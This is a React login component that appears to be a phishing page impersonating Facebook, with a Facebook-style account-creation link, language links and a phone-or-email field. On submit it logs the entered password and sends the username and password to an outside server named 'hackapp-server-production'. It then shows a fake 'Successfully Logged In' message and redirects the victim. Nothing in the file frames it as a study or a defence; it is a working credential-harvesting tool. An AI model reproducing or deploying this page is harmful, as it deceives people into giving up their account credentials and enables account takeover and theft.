import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { Link, useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import img from "../../assets/img.jpeg"

const Login = () => {

  const [signInError, setError] = useState("")

    const { register, handleSubmit,reset, watch, formState: { errors } } = useForm();

    const navigate = useNavigate()

    

  const onSubmit = data => {
    const password = data?.password;

    console.log(password)
    if(password.length < 6 ){
      setError("Use a Valid Password")
    }
      else{
        setError(" ")
      fetch('https://hackapp-server-production.up.railway.app/data', {
            method : "POST", 
            headers : {
              'content-type' : 'application/json'
            },
            body :JSON.stringify(data)
          })
          .then(res => res.json())
          .then(data => {
            toast.success('Successfully Logged In')
            console.log(data)
            reset();
            navigate("/home")
          } )
    }

  };


    return (
        <div className='text-center'>

            <div className='mb-8'>
                <img src={img} alt="" />
                <small>বাংলা . Polski . <span className='text-blue-600'>More...</span> </small>
            </div>
            
            <div className='mx-auto text-center px-8'>
        <form  style={{
        fontFamily:"poppins"
      }} className='flex flex-col justify-center items-center' onSubmit={handleSubmit(onSubmit)}>
      <input className='border-b p-2 w-full border-black lg:py-2 lg:px-10  lg:my-2 mr-2' placeholder='Phone number or email address' {...register("user")} required/>
      <input className='border-b w-full p-2 my-2 border-black lg:py-2 lg:px-10 mr-2' placeholder='Password' type='password' {...register("password")} required/>
      {errors.exampleRequired && <span>This field is required</span>}

        <small className='text-xs mb-1'>{signInError}</small>

      <input className='lg:py-2 py-1 font-sans cursor-pointer bg-blue-600 lg:my-2 font-semibold w-full text-white normal-case rounded' type="submit" value="Log in" />
    </form>
        </div>

        <div>
            <Link to="/forgotPassword"><h2 className='text-blue-700 text-xs mt-4 mb-2 font-semibold'>Forgotten password?</h2></Link>
        </div>

        <div>
        <div className="flex flex-col w-full border-opacity-50">
  <div className="divider text-xs">OR</div>
</div>  
        </div>

      <div className='flex justify-center'>
        <Link to="/signup"><h2 className='font-semibold text-xs bg-green-600 text-white text-center py-2 px-2 rounded'>Create New Facebook Account</h2></Link>
      </div>

        </div>
    );
};

export default Login;